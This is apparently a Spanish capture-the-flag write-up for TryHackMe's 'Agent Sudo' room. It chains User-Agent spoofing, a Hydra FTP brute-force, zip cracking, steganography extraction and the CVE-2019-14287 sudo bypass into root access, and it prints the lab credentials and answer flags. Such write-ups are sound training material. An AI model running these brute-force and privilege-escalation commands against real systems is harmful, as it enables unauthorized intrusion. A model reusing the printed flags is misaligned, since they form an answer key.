# THM — Agent Sudo

**Plataforma:** TryHackMe  
**Dificultad:** Easy  
**OS:** Linux  
**Fecha:** 28/09/2026  
**Tags:** User-Agent, FTP, Hydra, Steganography, SSH, CVE-2019-14287, Sudo Bypass

---

## Resumen

Máquina Linux que encadena múltiples vulnerabilidades: bypass de autenticación web mediante User-Agent personalizado, fuerza bruta FTP, esteganografía en imágenes, acceso SSH y escalada de privilegios explotando CVE-2019-14287 en sudo.

---

## Reconocimiento

### Nmap
```bash
nmap -sV -sC 10.10.x.x
```

**Resultado:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29
```

Tres puertos abiertos: FTP, SSH y HTTP.

---

## Explotación

### Paso 1 — Bypass User-Agent (Puerto 80)

La página web mostraba el mensaje:
```
Dear agents, Use your own codename as user-agent to access the site.
From Agent R.
```

Usando **Burp Suite** intercepté la petición HTTP y modifiqué el header `User-Agent` probando letras del alfabeto. Con `User-Agent: C` obtuve una redirección a una página con el siguiente mensaje:

```
Attention chris,
Do not forget to change your password — it is too weak!
From Agent R
```

Dos datos clave: usuario **chris** y contraseña débil.

### Paso 2 — Fuerza bruta FTP con Hydra

Con el usuario `chris` y sabiendo que la contraseña era débil hago un ataque de fuerza bruta:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.x.x
```

**Resultado:** contraseña encontrada → `crystal`

### Paso 3 — Acceso FTP y descarga de archivos

```bash
ftp 10.10.x.x
# Usuario: chris
# Contraseña: crystal
ftp> ls
ftp> get cute-alien.jpg
ftp> get cutie.png
ftp> get To_agentJ.txt
```

El archivo `To_agentJ.txt` contenía:
```
Dear agent J,
All alien photos are fake. The real picture is in your directory.
Your login password is stored in the fake picture.
From Agent C
```

### Paso 4 — Esteganografía

Analicé las imágenes con binwalk:

```bash
binwalk -e cutie.png
```

Encontró un archivo ZIP protegido con contraseña. Lo crackeé con John:

```bash
zip2john archivo.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Contraseña del ZIP: `alien`

Dentro del ZIP había un archivo con la contraseña para steghide:

```bash
steghide extract -sf cute-alien.jpg
# Passphrase: [contraseña encontrada]
```

Extrajo un archivo con credenciales SSH:
- Usuario: `james`
- Contraseña: `hackerrules!`

### Paso 5 — Acceso SSH

```bash
ssh james@10.10.x.x
```

Flag de usuario encontrada en `/home/james/user_flag.txt`

---

## Escalada de Privilegios — CVE-2019-14287

```bash
sudo -l
```

**Resultado:**
```
(ALL, !root) /bin/bash
```

Esta configuración intenta prohibir ejecutar bash como root, pero es vulnerable a **CVE-2019-14287**. El UID `-1` es interpretado por sudo como UID 0 (root):

```bash
sudo -u#-1 /bin/bash
```

Acceso root obtenido. Flag en `/root/root.txt`

---

## Flags

- **User flag:** `b03d975e8c92a7c04146cfa7a5a313c7`
- **Root flag:** `b53a02f55b57d4439e3341834d70c062`

---

## Aprendido

- Los headers HTTP como User-Agent pueden ser vectores de enumeración
- Las contraseñas débiles en servicios como FTP son un riesgo crítico
- La esteganografía puede esconder información dentro de imágenes aparentemente normales
- La configuración `(ALL, !root)` en sudoers NO es segura — CVE-2019-14287 la bypasea
- Siempre actualizar sudo a versión 1.8.28+ para parchear esta vulnerabilidad
- Encadenar múltiples vulnerabilidades pequeñas puede llevar a compromiso total

---

## Referencias

- [CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287)
- [Sudo vulnerability explanation](https://www.sudo.ws/security/advisories/minus_1_uid/)
